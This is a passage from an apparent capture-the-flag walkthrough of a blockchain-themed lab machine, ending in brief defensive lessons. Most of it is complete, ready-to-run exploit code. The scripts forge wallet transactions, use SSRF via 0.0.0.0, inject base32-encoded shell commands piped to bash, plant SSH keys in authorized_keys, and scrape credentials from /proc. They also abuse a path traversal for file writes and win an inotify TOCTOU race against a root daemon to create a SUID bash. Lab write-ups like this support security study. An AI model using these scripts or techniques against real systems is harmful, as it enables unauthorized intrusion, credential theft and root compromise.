2. Exploitation

Forge a VIP wallet

The “VIP Node Management” surface requires a wallet with balance ≥ 10. calc_balance() sums every transaction where our address is the sender/receiver — starting from zero, and including pending transactions:

for pend_txn in pending_transactions:
    if self.address == pend_txn['sender']:   self.balance -= pend_txn['amount']
    elif self.address == pend_txn['receiver']: self.balance += pend_txn['amount']

/broadcast_transaction is unauthenticated and appends any JSON object (dedupe = exact dict match, so we vary the timestamp). Let's forge a credit to a wallet we control:

# create the wallet (python, ecdsa NIST256p) -> /tmp/wallet.json
python3 - <<'PY'
import ecdsa, json
sk = ecdsa.SigningKey.generate(curve=ecdsa.NIST256p)
wk = sk.get_verifying_key().to_string().hex()
open("/tmp/wallet.json","w").write(json.dumps({
  "private_key": sk.to_string().hex(), "public_key": wk, "address": wk}))
print("address:", wk)
PY

# inject a forged credit of 100 coins into the pending pool
curl -s -X POST http://<target-ip>:8080/broadcast_transaction \
  -H 'Content-Type: application/json' \
  -d '{"timestamp":"2026-09-05T00:00:00-forged","sender":"00","receiver":"<address>","amount":100,"signature":"00"}'

# load it -> balance 100 >= 10 -> VIP UI unlocked
curl -s -c cookies.jar -b cookies.jar http://<target-ip>:8080/dashboard/wallet \
  -F "action=load" -F "file=@/tmp/wallet.json"
💡 Why this works The wallet is just the pairing of a hex private_key/public_key. Nothing validates that the incoming pending transaction was ever signed or mined — calc_balance trusts whatever is in the in-memory pool. One forged credit is enough to pass every balance < 10 → "Permission Denied" gate.

SSRF → admin panel

The admin panel is gated by request.remote_addr == "127.0.0.1" (app.py is_admin()). The node registry rejects only loopback hostnames (ip_address(host).is_loopback), but 0.0.0.0 is not loopback — and connecting to it from inside the VM lands back on our own Flask process:

  1. Register a node whose URL is http://0.0.0.0:8080/admin/nodes/manage?action=ping_node&target=<payload>.
  2. Trigger /dashboard/vip/nodes/test_node/0 — the server does requests.get(node_url), so remote_addr becomes 127.0.0.1 and the admin handler runs.

Command injection in ping_node

ip = extract_ip_from_url(target)
output = subprocess.check_output(f"ping -w 4{ip}", shell=True, ...)   # app.py:317

extract_ip_from_url only slices off http(s)://, then .split('/')[0] and .split(':')[0] — a chopper, not a sanitizer. Note there is no space between -w 4 and {ip}. Injecting ip = 127.0.0.1$(...) yields ping -w 4127.0.0.1$(...) — ping fails on the bad argument, but the $(...) already executed through shell=True.

Because the value is split on / and :, the injected command must contain neither. base32’s alphabet (A-Z2-7, = padding) satisfies this:

127.0.0.1$('echo'${IFS}<BASE32>|${IFS}base32${IFS}-d|${IFS}bash'')

A root watchdog (cleanup_node.sh) pops our node off the registry every ~250 ms (remove_node&node_index=0), so register→trigger is looped until it lands.

RCE as walter — plant SSH key

Craft the exploit script. It forges the wallet, loads it, then races base32-encoded payloads through ping_node until one lands as walter:

#!/usr/bin/env python3
"""exploit_stage1_rce.py — forge VIP wallet + SSRF + ping_node RCE as walter."""
import base64, datetime as dt, json, os, socket, subprocess, sys, threading, time
from urllib.parse import urlencode
import ecdsa, requests

TARGET = "http://<target-ip>:8080"

def make_wallet():
    sk = ecdsa.SigningKey.generate(curve=ecdsa.NIST256p)
    vk = sk.get_verifying_key()
    return {"private_key": sk.to_string().hex(),
            "public_key": vk.to_string().hex(), "address": vk.to_string().hex()}

def forge_credit(s, address):
    for i in range(8):
        txn = {"timestamp": dt.datetime.now().isoformat() + f"-f{i}",
               "sender": "00", "receiver": address, "amount": 100, "signature": "00"}
        s.post(f"{TARGET}/broadcast_transaction", json=txn, timeout=10)

def fire(payload, duration=90):
    s = requests.Session()
    files = {"file": ("wallet.json", json.dumps(wallet).encode(), "application/json")}
    s.post(f"{TARGET}/dashboard/wallet", data={"action": "load"}, files=files, timeout=10)
    b32 = base64.b32encode(payload.encode()).decode()
    target = f"127.0.0.1$('echo'${{IFS}}{b32}|${{IFS}}base32${{IFS}}-d|${{IFS}}bash'')"
    node = f"http://0.0.0.0:8080/admin/nodes/manage?" + urlencode({"action": "ping_node", "target": target})
    end = time.time() + duration
    while time.time() < end:
        try:
            s.post(f"{TARGET}/dashboard/vip/nodes", data={"action": "register", "node": node}, timeout=10)
            s.get(f"{TARGET}/dashboard/vip/nodes/test_node/0", timeout=12)
        except requests.exceptions.RequestException:
            pass
        time.sleep(0.25)

wallet = make_wallet()
forge_credit(requests.Session(), wallet["address"])

with open(os.path.expanduser("~/.ssh/id_ed25519.pub")) as f:
    pub = f.read().strip()
plant = f"umask 077; mkdir -p /home/walter/.ssh; printf '%s\\n' '{pub}' >> /home/walter/.ssh/authorized_keys"
fire(plant)
print("[+] key planted. login with: ssh -i ~/.ssh/id_ed25519 walter@<target-ip>")

3. Privilege Escalation

Leak the root cron’s FTP password

The box self-heals: /etc/crontab runs root /opt/backup/backup.sh every 5 minutes, which tarballs the app dirs and uploads them to the containerized FTP on 15432. The FTP credentials are embedded in the curl argument of a short-lived root process — visible for a split second in /proc/*/cmdline. Let's beat the process exit with a fast poller:

# run on the target as walter
while :; do
  for p in /proc/[0-9]*/cmdline; do
    tr '\0' ' ' < "$p" 2>/dev/null | grep -q 'ftp://' && { tr '\0' ' ' < "$p"; echo; break; }
  done
  sleep 0.05
done | tee /tmp/ftp_capture.log

At the next :00/:05/:10/:15 tick:

/usr/bin/curl -T /tmp/_opt_blocksynergy.tar.gz ftp://ftpuser:<pass>@127.0.0.1:15432/upload/_opt_blocksynergy.tar.gz

Let's verify access to the FTP root:

curl -s ftp://ftpuser:<pass>@127.0.0.1:15432/upload/
# _opt_blocksynergy.tar.gz , _opt_staging.tar.gz
💡 Why bother This confirms the cron↔FTP↔restore-dir topology the TOCTOU relies on (/var/restore_work mirrors the uploaded archives). It also gives write access to the FTP root — a second way to play the race, though the inotify swap in stage 3 is cleaner.

Lateral — write as hank via dev server path traversal

devserver.service (127.0.0.1:5000, user hank) is a “Smart Contract Development Server”. Its debug hooks were left enabled (contract.py):

if self.debug == "True" and hook_val == "log":
    file = self.contract["__meta__"]["log_file"]
    logfile = f"/opt/staging/smart_contracts/logs/{file}"        # no normalization!
    with open(logfile, "a") as f:
        f.write(f"[{ts}] [{hook_name}] {content}\n")

log_file is joined directly onto the path — ../../../../ escapes to /. Every mint fires on_mint → arbitrary file write as hank, and return_logs() is the same path read back (a read primitive too).

⚠️ Gotcha POST / only 302s to /dashboard. Every mutation (upload, mint) must go to /dashboard itself; the session binds the mint to the just-uploaded contract. Leading \n in the hook content pushes the SSH key onto its own clean line; sshd ignores the junk timestamp line.

Craft the script (run on the target — the port is loopback-only) and plant our key in hank's authorized_keys:

#!/usr/bin/env python3
"""exploit_stage2_hank_write.py — run ON the target as walter (port 5000 is loopback)."""
import json, os, re, sys
from collections import OrderedDict
import requests

BASE = "http://127.0.0.1:5000"

def contract_json(rel_path, content):
    content = "\n" + content.strip("\n")            # leading \n = key sits on its own line
    return OrderedDict([
        ("name", "write"), ("owner", "Developer"), ("debug", "True"),
        ("logic", {"mint": "allow"}), ("storage", {"balances": {}, "total_supply": 0}),
        ("hooks", {"on_mint": "log"}),
        ("__meta__", {
            "log_file": rel_path,
            "log_content": {"on_mint": content},
        }),
    ])

s = requests.Session()
content = open(os.path.expanduser("~/.ssh/id_ed25519.pub")).read().strip()
contract = contract_json("../../../../home/hank/.ssh/authorized_keys", content)
r1 = s.post(f"{BASE}/dashboard", data={"action": "upload_contract"},
            files={"contract_file": ("c.json", json.dumps(contract).encode(), "application/json")}, timeout=15)
assert "Contract loaded" in r1.text
r2 = s.post(f"{BASE}/dashboard", data={"action": "contract_mint", "contract_mint_amount": "7"}, timeout=15)
r3 = s.get(f"{BASE}/dashboard", timeout=15)                      # Log Output readback
print("[+] key written" if "ssh-ed25519" in r3.text else "[-] failed")

Privilege Escalation — restore-daemon TOCTOU → SUID bash

The heal daemon (restore.service, user root) polls every ~10 s and watches /var/restore_work. The watch dir is root:developers drwxrwxr-x — writable by an account in the developers group (i.e. hank):

/etc/crontab   */5 * * * *   root  /opt/backup/backup.sh
                    tar czf /tmp/_opt_*.tar.gz  ->  curl -T ftp://.../upload/

restore.service  root  /bin/bash /opt/backup/restore_daemon.sh   (sleep-10 loop)
                    watches /var/restore_work (inotify)
                    new trusted archive -> sha256 verify -> tar -xzf  (as root!)

Why we matter: a developers user can plant files there, and the daemon blindly extracts verified archives into /.

The “verify then extract” pair is a TOCTOU: the file is read at verification time and again at extraction time. Swap in between → root-owned content of our choosing.

We win it by mirroring the daemon’s inotify stream: remember CLOSE_WRITE/MOVED_TO of a trusted name (file staged, hash already checked), then on the next CREATE of that name, atomically rename our malicious archive over it — the extraction then runs on our bytes.

The payload archive contains one member: opt/blocksynergy/.diag = /bin/bash, mode 0o4755, uid/gid 0. After extraction, /opt/blocksynergy/.diag is a SUID root bash.

Craft the exploit script (run on the target as a developers user):

#!/usr/bin/env python3
"""exploit_stage3_root.py — run ON the target as a 'developers' user (hank)."""
import ctypes, io, os, re, shutil, stat, struct, subprocess, sys, tarfile, time
import ctypes.util

W, TRIG, MARK = "/var/restore_work", "/opt/staging/restore", "/opt/blocksynergy/.diag"
NAMES = ("_opt_blocksynergy.tar.gz", "_opt_staging.tar.gz")

tag = os.urandom(3).hex()
SRC = f"{W}/.pl_{tag}.tar.gz"
bash = open("/bin/bash", "rb").read()
ti = tarfile.TarInfo("opt/blocksynergy/.diag")
ti.size = len(bash); ti.mode = 0o4755; ti.uid = ti.gid = 0; ti.mtime = int(time.time())
with tarfile.open(SRC, "w:gz") as t:
    t.addfile(ti, io.BytesIO(bash))

racer = f"""import ctypes,ctypes.util,os,shutil,struct,time
W='{W}';SRC='{SRC}';MARK='{MARK}';NAMES={NAMES}
CW,CN,CR,MV=0x8,0x10,0x100,0x80
libc=ctypes.CDLL(ctypes.util.find_library('c'),use_errno=True)
fd=libc.inotify_init();libc.inotify_add_watch(fd,W.encode(),CW|CN|CR|MV)
os.set_blocking(fd,False);end=time.time()+400;done=set();lt=0
while time.time()<end:
    if os.path.exists(MARK):break
    if time.time()-lt>2:
        try:
            if not os.path.exists('{TRIG}'):open('{TRIG}','w').close()
        except Exception:pass
        lt=time.time()
    try:buf=os.read(fd,8192)
    except (BlockingIOError,OSError):time.sleep(0.002);continue
    i=0
    while i+16<=len(buf):
        _w,mask,_c,ln=struct.unpack_from('iIII',buf,i);i+=16
        nm=buf[i:i+ln].split(b'\\0',1)[0].decode(errors='replace');i+=ln
        if not nm or nm.startswith('.pl_') or nm.endswith('.n'):continue
        if mask&(CW|MV) and nm in NAMES:done.add(nm)
        elif mask&CN and nm in done:
            t=os.path.join(W,nm)
            try:shutil.copyfile(SRC,t+'.n');os.rename(t+'.n',t)
            except Exception:pass
            done.discard(nm)
print('won' if os.path.exists(MARK) else 'timeout')"""
open(f"/tmp/.racer_{tag}.py", "w").write(racer)
subprocess.Popen(["sh", "-c", f"setsid python3 /tmp/.racer_{tag}.py >/tmp/.r_{tag}.log 2>&1 &"])

deadline = time.time() + 420
while time.time() < deadline:
    try:
        if stat.S_ISUID & os.stat(MARK).st_mode:
            out = subprocess.run([MARK, "-p", "-c", "id; cat /root/root.txt"],
                                 capture_output=True, text=True).stdout
            print(out); break
    except FileNotFoundError:
        time.sleep(2)

📌 Why -p A setuid bash drops privileges when it detects the SUID bit; -p tells it to keep the effective UID, so euid=0(root) while uid stays 1000 — enough to read /root/root.txt. Every 5-minute cron tick re-publishes a trusted archive, giving a fresh race window, so on timeout just re-run.

4. Flag Paths

  • User flag: /home/walter/user.txt
  • Root flag: /root/root.txt

Lessons

  • Unauthenticated pending-tx injection forged VIP access — never trust an in-memory pool for authorization.
  • 0.0.0.0 is not loopback; SSRF filters that only check is_loopback miss it.
  • A chopper (split('/')) is not a sanitizer — base32 smuggles the payload past it, and missing space in ping -w 4{ip} still executes $(...) via shell=True.
  • Debug-hook path join without normalization is arbitrary file write; mutations living only on /dashboard is an easy footgun.
  • Hash-verify-then-extract on a group-writable dir is a TOCTOU. Extract only after an atomic, exclusive open of the verified inode — and never as root into /.
